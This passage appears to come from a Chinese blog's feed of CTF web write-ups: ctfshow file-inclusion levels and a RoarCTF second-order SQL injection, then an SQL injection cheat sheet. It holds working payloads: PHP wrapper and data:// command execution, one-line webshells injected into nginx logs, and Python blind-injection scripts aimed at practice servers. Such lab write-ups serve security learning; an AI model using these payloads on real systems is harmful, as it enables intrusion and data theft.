<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDCDADFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/p/31915a1e.html</url>
    <content><![CDATA[<h1 id="csdn博客，web教学文件包含"><a href="#csdn博客，web教学文件包含" class="headerlink" title="csdn博客，web教学文件包含"></a>csdn博客，web教学文件包含</h1><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h1 id="ctfshow🙌🤞✌👏👍👌"><a href="#ctfshow🙌🤞✌👏👍👌" class="headerlink" title="ctfshow🙌🤞✌👏👍👌"></a>ctfshow🙌🤞✌👏👍👌</h1><h1 id="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"><a href="#文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖" class="headerlink" title="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"></a>文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><h3 id="PHP伪协议读取"><a href="#PHP伪协议读取" class="headerlink" title="PHP伪协议读取"></a>PHP伪协议读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">伪协议相关知识点网站：https://blog.csdn.net/weixin_29466397/article/details/115978566</span><br></pre></td></tr></table></figure>



<h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>先用hackbar输入?file=php://filter/convert.base64-encode/resource=flag.php</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDDDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>直接excute得出base64加密，再解密。不能缺少convert，这是转换编码的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php伪协议，事实上是其支持的协议与封装协议。而其支持的协议有：</span><br><span class="line"></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"></span><br><span class="line">data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>

<p>一道例题：比如根据题目已经知道flag就在index.php文件里，所以就用PHP://filter读取index.php</p>
<p>然后进行Base64解码就得到flag</p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>这是题目，php被？？？替换掉了，因此不能明文读取文件</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>方法解题：1.题目直接查看源代码，然后输入后，直接可以查看flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><h3 id="文件包含日志上传，一句话木马，运用蚁剑"><a href="#文件包含日志上传，一句话木马，运用蚁剑" class="headerlink" title="文件包含日志上传，一句话木马，运用蚁剑"></a>文件包含日志上传，一句话木马，运用蚁剑</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>题目中date，php都被替换了，不能直接使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">关键包含日志文件 进行getshell 日志文件路径： ?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>先用hackbar进行excute,再用burpsuit抓包，之后修改user，上传一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>@evaluate（取前四个字母）(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>之后用蚁剑上传excute后了网站，密码为cmd，打开就可以查看flag；<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><h3 id="绕过die-usr-2"><a href="#绕过die-usr-2" class="headerlink" title="绕过die    usr-2"></a>绕过die    usr-2</h3><p>相关网站：<a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>date，base64都被过滤掉了。引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</span><br><span class="line"> iconv ( string $in_charset , string $out_charset , string $str )：将字符串$str从in_charset编码转换到$out_charset</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php （创建一个a.php）</span></span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?(上传一个<span class="number">1</span>的文件到a.php)</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>再查看源码就能得到flag，根据上面箭头的一步步解题下来。</p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>第一种方法如web80</p>
<p>第二种方法：直接先抓包，再进行修改user，传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval’tuate‘($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着传入 ?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>再运行查看源码就ok</p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析一下sql的注入</title>
    <url>/p/671479cc.html</url>
    <content><![CDATA[<p>菜狗记录，如有错误，请见谅</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>考点：</p>
<blockquote>
<p>​    二次注入</p>
<p>​    XFF注入</p>
<p>​    盲注</p>
</blockquote>
<p>题目打开显示</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513141941239.png" alt="image-20230513141941239"></p>
<p>好像没找到什么东西，看看源码</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513142020962.png" alt="image-20230513142020962"></p>
<p>看到了个ip联想到了xff或者ssrf之类的，后面证实是xff的</p>
<p>抓包改一下试试</p>
<blockquote>
<p>X-Forwarded-For:1112</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513143419999.png"></p>
<p>可以发现有回显的改变，注意这里他是要修改不同的数据才会更新ip，但是之后没想到改成啥，看了wp发现是二次注入</p>
<p>单引号闭合试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513163700906.png" alt="image-20230513163700906"></p>
<p>执行原理</p>
<p>数据在写入数据库时</p>
<p>1.1‘or’1在写入时为 Current Ip </p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513163657691.png" alt="image-20230513163657691"></p>
<p>2.当输入新的xff 123(任意)时，1‘or’1会被当做Last ip， 123会成为新的Current Ip，而1‘or’1会写入到数据库中</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513163442528.png" alt="image-20230513163442528"></p>
<p>3.当再次执行123时由于写入数据相同，会提取当时的数据同时执行1‘or’1所以回显1</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513163455791.png" alt="image-20230513163455791"></p>
<p>之后就是用脚本爆破一下了，以下是经典的布尔盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_ascii</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://node4.buuoj.cn:29972&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high)//<span class="number">2</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=87c6b3b8-68f7-41b4-a4d8-0f87b8980868&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; + ascii(substr((select group_concat(schema_name)from information_schema.schemata), % d, 1)) &gt; % d + &#x27;0&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment"># payload = &quot;0&#x27; + ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(&#x27;F4l9_D4t4B45e&#x27;))),&#123;&#125;,1))&gt;&#123;&#125; + &#x27;0&quot;.format(i, mid)</span></span><br><span class="line">            <span class="comment"># payload = &quot;0&#x27; + ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;F4l9_t4b1e&#x27;))),&#123;&#125;,1))&gt;&#123;&#125; + &#x27;0&quot;.format(i, mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27;+ ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125;+&#x27;0&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">            header[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload</span><br><span class="line">            test = <span class="string">&quot;33333&quot;</span></span><br><span class="line">            res = requests.get(url, headers=header)</span><br><span class="line">            header[<span class="string">&quot;X-Forwarded-For&quot;</span>] = test</span><br><span class="line">            res = requests.get(url, headers=header)</span><br><span class="line">            res = requests.get(url, headers=header)</span><br><span class="line">            <span class="comment"># print(res.text[-5])</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> == res.text[-<span class="number">5</span>]:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_ascii()</span><br></pre></td></tr></table></figure>

<p>它使用了 requests 库来向某个 URL 发送 HTTP 请求。这个 URL 是一个 Web 应用程序的地址，存在 SQL 注入漏洞。程序通过构造 SQL 注入攻击的 payload，来试图从数据库中提取一些数据。</p>
<p>使用了二分查找的算法，来寻找字符集中的每个字符，直到找到一个字符，它的 ASCII 码大于 mid。mid 的初值为字符集中所有字符的平均值，即 (32+128)/2=80。通过反复调用 Web 应用程序，程序可以不断缩小字符集中字符的范围，直到最终找到每个字符的 ASCII 码。程序打印出的结果是每个字符的 ASCII 码，这些字符最终组成了一个字符串，表示从数据库中提取的数据。</p>
<blockquote>
<p>payload = “0’ + ascii(substr((select group_concat(schema_name)from information_schema.schemata), % d, 1)) &gt; % d + ‘0”%(i,mid)</p>
<p>这是一个 SQL 注入攻击的 payload，用于获取数据库中信息模式（information_schema）中所有模式（schema）的名称，并将它们连接成一个逗号分隔的字符串（即使用 <code>group_concat</code> 函数）。这个 payload 通过使用 <code>substr</code> 函数来获取该字符串中的单个字符，并使用 <code>ascii</code> 函数将其转换为 ASCII 码。</p>
<p>具体来说，<code>%d</code> 和 <code>%d</code> 分别是 Python 字符串格式化语法中用于替换整数的占位符。在这个 payload 中，第一个 <code>%d</code> 将会被变量 <code>i</code> 的值所替换，第二个 <code>%d</code> 则会被变量 <code>mid</code> 的值所替换。因此，每次请求将会获取字符串中的下一个字符，并将它与 <code>mid</code> 进行比较。</p>
<p>整个 payload 中的o’ +…+o’部分则是将 SQL 语句中的字符串连接起来的方式。由于单引号在 SQL中是表示字符串的限定符，因此需要将单引号用加号连接在一起，以确保 SQL语句的正确性</p>
</blockquote>
<p>之后就能拿到flag了</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513170241910.png" alt="image-20230513170241910"></p>
<p>方法二：</p>
<blockquote>
<p>0’+conv(hex(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),1,5)),16,10)+’0</p>
</blockquote>
<p>通过这个payload拿到前五个字符的整数形式，只需要再让它转换成16进制进而变成字符就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_ascii</span>():</span></span><br><span class="line">    result_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://node4.buuoj.cn:29972&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>,<span class="number">5</span>):</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=87c6b3b8-68f7-41b4-a4d8-0f87b8980868;IS_STATIC=1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;+conv(hex(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,5)),16,10)+&#x27;0&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        header[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload</span><br><span class="line">        test = <span class="string">&quot;33333&quot;</span></span><br><span class="line">        res = requests.get(url, headers=header)</span><br><span class="line">        header[<span class="string">&quot;X-Forwarded-For&quot;</span>] = test</span><br><span class="line">        res = requests.get(url, headers=header)</span><br><span class="line">        res = requests.get(url, headers=header)</span><br><span class="line">        result = <span class="built_in">int</span>(res.text.split(<span class="string">&quot; &quot;</span>)[-<span class="number">2</span>])</span><br><span class="line">        tra_result = binascii.a2b_hex(<span class="built_in">hex</span>(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="comment"># location = res.text.find(&quot;Last Ip: &quot;)</span></span><br><span class="line">        <span class="comment"># print(location)</span></span><br><span class="line">        result_final += tra_result</span><br><span class="line">        <span class="built_in">print</span>(result_final)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_ascii()</span><br></pre></td></tr></table></figure>

<p>返回的值我们用python把他转化一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(lastip))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(lastip))</span><br><span class="line">all_result = binascii.a2b_hex(<span class="built_in">hex</span>(lastip)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(all_result)</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/Mrs_H/article/details/121055436">https://blog.csdn.net/Mrs_H/article/details/121055436</a></p>
<p>下面学一下sql的注入语句</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>下面只是一些常用的语句，详细的注入原理需要查看其他的文档</p>
<h3 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h3><ol>
<li>闭合方式 –&gt;  判断类型 –&gt; 测试绕过</li>
<li>oder by查字段数 –&gt; select 1,2,3确定显示位 –&gt; 查数据库名 –&gt;查表名 –&gt; 列名 –&gt; 内容</li>
</ol>
<h3 id="二、分类"><a href="#二、分类" class="headerlink" title="二、分类"></a>二、分类</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入"></a>1.联合注入</h4><blockquote>
<p>查字段数</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> order <span class="keyword">by</span> <span class="number">4</span> <span class="meta">#  //返回Ture</span></span><br><span class="line"><span class="number">1&#x27;</span> order <span class="keyword">by</span> <span class="number">5</span> <span class="meta">#  //返回False</span></span><br><span class="line"></span><br><span class="line">说明字段数为<span class="number">4</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>确定位置</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,3,4 #</span><br><span class="line"></span><br><span class="line">//select 1,2,3,4 只是一个占位符，用于表示注入攻击的语句中需要插入的数据的格式。具体来说，这个语句表示一个包含 4 个元素的结果集，每个元素的值分别为 1、2、3、4。这个结果集的作用是将注入攻击者构造的数据插入到原始查询语句中的结果集中，从而完成注入攻击。在实际的注入攻击中，这个占位符的内容可能会有所不同，具体取决于注入攻击的目标和攻击 </span><br></pre></td></tr></table></figure>

<blockquote>
<p>查当前数据库名</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">0&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>查当前数据库所有表名</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">0&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables WHERE TABLE_SCHEMA=database() <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>将一个包含 4 个元素的结果集插入到查询结果中。插入的结果集包含 1, 所有表名连接成的字符串, 3, 4 这四个元素。由于注入攻击成功，查询结果将包含注入攻击者构造的结果集，其中第二个元素是当前数据库中所有表的名称连接成的字符串。</p>
<blockquote>
<p>查指定表名的所有字段名</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">0&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns WHERE table_name=<span class="string">&quot;flag&quot;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>这是一条基于 SQL 注入的查询语句，用于获取名为 <code>flag</code> 的表的所有列名。</p>
<p>其中，<code>0&#39;</code> 是注入攻击的一部分，用于绕过原始查询语句中字符串的闭合符号，<code>union select</code> 则是将注入的查询语句和原始查询语句的结果集合并，<code>1,group_concat(column_name),3,4</code> 表示查询结果集中的四个元素，其中第二个元素 <code>group_concat(column_name)</code> 表示将名为 <code>flag</code> 的表中的所有列名用逗号连接成一个字符串。<code>from information_schema.columns WHERE table_name=&quot;flag&quot;</code> 是注入攻击的另一部分，其中的 <code>information_schema.columns</code> 是一个元数据表，用于存储数据库中所有表的列信息，<code>WHERE</code> 子句用于过滤出指定表名的列信息。</p>
<blockquote>
<p>查指定表的指定字段的内容</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">0&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,ctf_flag,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> flag <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>将值为 <code>ctf_flag</code> 的 <code>flag</code> 表中的所有行作为第二个查询的结果，并将这个结果组合到第一个查询的结果中。</p>
<h4 id="2-布尔注入"><a href="#2-布尔注入" class="headerlink" title="2.布尔注入"></a>2.布尔注入</h4><blockquote>
<p>爆当前数据库名<br> a.爆长度</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">or (select length(database()))&gt;0 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>语句 <code>or (select length(database()))&gt;0 #</code> 中的 <code>or</code> 代表逻辑或的操作符，而 <code>(select length(database()))&gt;0</code> 是一个子查询，其目的是计算当前数据库的名称的长度是否大于 0。如果数据库名称的长度大于 0，则子查询将返回真（<code>True</code>），否则返回假（<code>False</code>）。由于使用了注释符号 <code>#</code>，因此这个查询语句之后的所有内容都将被视为注释并被忽略。因此，这个查询语句的意思是：如果当前数据库的名称的长度大于 0，则这个查询语句将返回真。</p>
<blockquote>
<p>b.爆内容</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">or ascii(substr(database(),1,1))&gt;100 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> <code>or</code> 代表逻辑或，<code>ascii(substr(database(),1,1))</code> 的作用是获取数据库名称的第一个字符的 ASCII 码值，<code>&gt;100</code> 则表示这个 ASCII 码值大于 100。如果当前数据库名称的第一个字符的 ASCII 码值大于 100，则这个查询语句将返回真（<code>True</code>），否则返回假（<code>False</code>）。</p>
<blockquote>
<p>爆当前数据库所有表名</p>
<p>a.爆长度</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> (<span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params">group_concat(table_name</span>)) <span class="keyword">from</span> information_schema.tables WHERE TABLE_SCHEMA</span>=database())&gt;<span class="number">16</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><code>or</code> 代表逻辑或，<code>select length(group_concat(table_name)) from information_schema.tables WHERE TABLE_SCHEMA=database()</code> 的作用是获取当前数据库中所有表名拼接后的字符串长度。如果这个长度大于 16，则这个查询语句将返回真（<code>True</code>），否则返回假（<code>False</code>）。可以利用这个语句来判断当前数据库中有多少个表。</p>
<blockquote>
<p>b.爆内容</p>
<p>1）使用burpsuite的Intruder插件bluster bomb模式直接爆破</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">or</span> <span class="title">substr</span>(<span class="params">(<span class="keyword">select</span> (group_concat(table_name</span>)) <span class="keyword">from</span> information_schema.tables WHERE TABLE_SCHEMA</span>=database()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&quot;a&quot;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>2）使用python脚本二分法爆破(ascii码中可显字符范围：32-126)</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">or</span> <span class="title">ascii</span>(<span class="params">substr((<span class="keyword">select</span> (group_concat(table_name</span>)) <span class="keyword">from</span> information_schema.tables WHERE TABLE_SCHEMA</span>=database()),<span class="number">6</span>,<span class="number">1</span>))&gt;<span class="number">100</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>它的作用是判断当前数据库中第 6 个表名的第一个字符的 ASCII 值是否大于 100。如果是，则这个查询语句将返回真（<code>True</code>），否则返回假（<code>False</code>）。可以利用这个语句来逐个获取数据库中所有表名的每个字符，并判断其 ASCII 值，从而获取表名。</p>
<blockquote>
<p>爆指定表名的所有字段名</p>
<p>a.爆长度</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">or (SELECT length(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name like <span class="string">&quot;f14g&quot;</span>)&gt;8 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这个子查询的作用是获取名为”h1dden_f14g”的表中所有列名的长度，并将这些长度聚合成一个字符串，即<code>GROUP_CONCAT(column_name)</code>，然后返回这个字符串的长度，即<code>length(GROUP_CONCAT(column_name))</code>。</p>
<p>这个查询还使用了一个条件<code>WHERE table_name like &quot;f14g&quot;</code>，即在<code>information_schema.columns</code>表中筛选出表名为”f14g”的表的所有列名。</p>
<p>整个条件语句的含义是，如果”h1dden_f14g”表中的列名字符串的长度大于8，就返回True，否则返回False。这种方式可以用于判断某个字符串的长度或者某个子查询的结果是否符合要求，从而实现布尔注入。</p>
<blockquote>
<p>b.爆内容</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">or</span> <span class="title">substr</span>(<span class="params">(<span class="keyword">select</span> (group_concat(column_name</span>)) <span class="keyword">from</span> information_schema.columns WHERE table_name like &quot;f14g&quot;),1,1)</span>=<span class="string">&quot;a&quot;</span> <span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">or</span> <span class="title">ascii</span>(<span class="params">substr((<span class="keyword">select</span> (group_concat(column_name</span>)) <span class="keyword">from</span> information_schema.columns WHERE table_name like &quot;f14g&quot;),4,1))&gt;32 # </span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>or substr((select (group_concat(column_name)) from information_schema.columns WHERE table_name like &quot;f14g&quot;),1,1)=&quot;a&quot; #</code> 的意思是判断当前数据库的某个名为 <code>f14g</code> 的数据表中的列名，是否以字母 “a” 开头。</li>
<li><code>or ascii(substr((select (group_concat(column_name)) from information_schema.columns WHERE table_name like &quot;f14g&quot;),4,1))&gt;32 #</code> 的意思是判断当前数据库的某个名为 <code>f14g</code> 的数据表中的列名第 4 个字符的 ASCII 值是否大于 32。</li>
</ul>
<blockquote>
<p>查指定表的指定字段的内容</p>
</blockquote>
<p>a.爆长度</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> (<span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params">the_f14g</span>) <span class="keyword">from</span> h1dden_f14g limit 0,1)</span>=<span class="number">50</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>这个语句中的 <code>or (select length(the_f14g) from h1dden_f14g limit 0,1)=50</code> 是一条布尔型 SQL 注入语句。它的意思是检查 <code>h1dden_f14g</code> 表的第一行中的 <code>the_f14g</code> 字段的长度是否为50。如果结果为真，则返回查询结果，否则跳过这条语句。</p>
